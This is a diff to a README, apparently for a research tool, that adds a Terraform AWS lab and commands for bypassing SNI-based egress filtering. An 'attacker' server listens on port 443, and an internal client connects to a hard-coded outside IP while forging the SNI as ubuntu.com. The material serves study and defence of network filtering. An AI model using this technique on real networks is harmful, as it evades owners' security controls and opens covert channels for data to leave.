@@ -39,6 +39,56 @@ go run client.go
 go run server.go
 ```
 
+## Full Example with a Terraformed AWS Environment
+
+Deploy the environment with Terraform.
+
+```
+cd terraform
+export AWS_PROFILE="<your-profile>"
+terraform init
+terraform apply
+```
+
+Connect to the NAT instance.
+
+```
+ssh -i ./ssh/id_ed25519 \
+    -o IdentitiesOnly=yes \
+    ubuntu@<NAT-instance-public-ip>
+```
+
+Connect to the private instance by using the NAT instance as a jump host.
+
+```
+ssh -v -i ./ssh/id_ed25519 \
+    -o IdentitiesOnly=yes \
+    -o ProxyCommand="ssh -i ./ssh/id_ed25519 -o IdentitiesOnly=yes -W %h:%p ubuntu@<NAT-instance-public-ip>" \
+    ubuntu@<private-instance-private-ip>
+```
+
+## Commands
+
+On the filtering host, watch passing SNI fields using `tcpdump`.
+
+```sh
+sudo tcpdump -i any -n -A -s0 port 443 | grep -e '\.\(com\|org\|net\|io\)'
+```
+
+On the attacker host, have the service listen on all interfaces.
+
+```sh
+sudo ./server 0.0.0.0 443
+```
+
+On the internal host, have the client connect to the attacker server,
+forging the SNI value.
+
+```sh
+./client https://3.87.129.194 ubuntu.com
+```
+
+
 ## Ethical Considerations
 
 This example is intended for educational and research purposes only. Always obtain proper authorization before testing on any networks or systems you do not own or have explicit permission to test.
